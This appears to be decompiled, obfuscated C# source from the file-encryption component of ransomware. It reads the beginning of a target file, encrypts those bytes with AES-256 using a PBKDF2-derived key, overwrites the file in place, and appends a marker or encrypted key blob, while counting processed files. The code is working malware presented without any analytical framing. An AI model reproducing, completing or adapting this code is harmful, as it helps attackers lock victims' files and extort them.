using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class scvFMtYlVeb
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] AIyOtGwWrXEZ(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = hnFaUNxbVo(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes hnFaUNxbVo(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] hpGAnTLbaTEeN(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (OwCGWssNrah.KZdUWCMWRza == getString_0(107396963))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (OwCGWssNrah.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(OwCGWssNrah.ndioqUCcjeEwRygxn, getString_0(107398712) + string_0 + getString_0(107378863) + ex.Message + getString_0(107396794));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool mtRrTfokQWXkK(string MLqpVyadMeGdgmK, byte[] DNBUuDIlXHcMv, byte[] kRGGWEuoppgYu = null)
	{
		try
		{
			byte[] array = null;
			if (OwCGWssNrah.KZdUWCMWRza == getString_0(107396963))
			{
				array = (OwCGWssNrah.IflXfWBKZN ? Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837))) : Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(MLqpVyadMeGdgmK, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(DNBUuDIlXHcMv, 0, DNBUuDIlXHcMv.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(MLqpVyadMeGdgmK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OwCGWssNrah.IflXfWBKZN)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(kRGGWEuoppgYu, 0, kRGGWEuoppgYu.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (OwCGWssNrah.IflXfWBKZN ? Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837))) : Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846))));
				FileStream fileStream2 = new FileStream(MLqpVyadMeGdgmK, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(DNBUuDIlXHcMv, 0, DNBUuDIlXHcMv.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(MLqpVyadMeGdgmK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OwCGWssNrah.IflXfWBKZN)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(kRGGWEuoppgYu, 0, kRGGWEuoppgYu.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			OwCGWssNrah.SYFhGDZRgJn++;
		}
		catch (Exception ex)
		{
			if (OwCGWssNrah.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(OwCGWssNrah.ndioqUCcjeEwRygxn, getString_0(107398712) + MLqpVyadMeGdgmK + getString_0(107378796) + ex.Message + getString_0(107396794));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (OwCGWssNrah.IflXfWBKZN ? Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378837))) : Encoding.ASCII.GetBytes(OwCGWssNrah.iBDvjzxzEcC(OwCGWssNrah.HEeLoGRVTvMU) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846)) + Convert.ToString(OwCGWssNrah.XLyVBayizjzN) + OwCGWssNrah.iBDvjzxzEcC(getString_0(107378846))));
				FileStream fileStream4 = new FileStream(MLqpVyadMeGdgmK, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(DNBUuDIlXHcMv, 0, DNBUuDIlXHcMv.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(MLqpVyadMeGdgmK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!OwCGWssNrah.IflXfWBKZN)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(kRGGWEuoppgYu, 0, kRGGWEuoppgYu.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static scvFMtYlVeb()
	{
		Strings.CreateGetStringDelegate(typeof(scvFMtYlVeb));
	}
}
